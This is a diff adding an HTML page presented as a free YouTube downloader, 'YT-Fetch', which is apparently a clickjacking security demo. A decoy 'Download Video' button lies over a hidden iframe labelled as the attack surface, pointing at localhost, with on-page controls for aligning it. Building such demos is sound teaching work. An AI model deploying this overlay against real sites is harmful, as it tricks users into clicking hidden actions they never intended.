@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YT-Fetch | Free YouTube Video Downloader</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <header class="navbar">
+    <div class="nav-inner">
+      <div class="logo">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+            <polyline points="7 10 12 15 17 10"></polyline>
+            <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+        </div>
+        <span>YT-Fetch</span>
+      </div>
+      <div class="nav-links">
+        <!-- Links removed for cleaner UI as requested -->
+      </div>
+    </div>
+  </header>
+
+  <main class="hero">
+    <div class="hero-content">
+      <h1>Download YouTube Videos</h1>
+      <p>Free, fast, and secure. Paste the link below to get started in seconds.</p>
+
+      <!-- URL Input Area -->
+      <div class="search-box">
+        <input type="text" id="yt-input" placeholder="Paste YouTube link here..." autocomplete="off">
+        <button class="btn-fetch" id="fetch-btn" type="button">Start</button>
+      </div>
+
+      <div class="loader-wrap" id="loader">
+        <div class="spinner"></div>
+        <p>Analyzing video...</p>
+      </div>
+
+      <!-- Video Result Area (Hidden initially) -->
+      <div class="result-card" id="result-card" style="display: none;">
+        <div class="video-preview">
+          <img id="vid-thumb" src="" alt="Video thumbnail">
+          <div class="vid-info">
+            <h3 id="vid-title">Video Title Loading...</h3>
+            <p id="vid-meta">YouTube &middot; MP4</p>
+          </div>
+        </div>
+
+        <div class="download-section">
+          <div class="format-select">
+            <label for="quality">Format:</label>
+            <select id="quality">
+              <option>MP4 Video — 1080p (HD)</option>
+              <option>MP4 Video — 720p</option>
+              <option>MP3 Audio — 320kbps</option>
+            </select>
+          </div>
+
+          <!-- THE ATTACK SURFACE -->
+          <div class="submit-area">
+            <button class="decoy-btn" type="button" id="decoy-btn">
+              Download Video
+            </button>
+            <iframe
+              id="evil-iframe"
+              src="http://localhost:8001/"
+              width="1200"
+              height="1000"
+              scrolling="no"
+              tabindex="-1"
+              aria-hidden="true"
+              title=""
+            ></iframe>
+          </div>
+          <!-- END ATTACK SURFACE -->
+
+        </div>
+      </div>
+
+      <p class="demo-hint" style="margin-top: 40px; text-align: left; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+        <strong style="color: #60a5fa;">Security Demo Controls:</strong><br>
+        Press <strong>D</strong> to toggle the hidden iframe view.<br>
+        <strong>Shift + Arrows</strong> to manual tune alignment if needed.<br>
+        <strong>R</strong> to reset calibration defaults.
+      </p>
+
+    </div>
+  </main>
+
+  <script src="inject.js"></script>
+</body>
+</html>
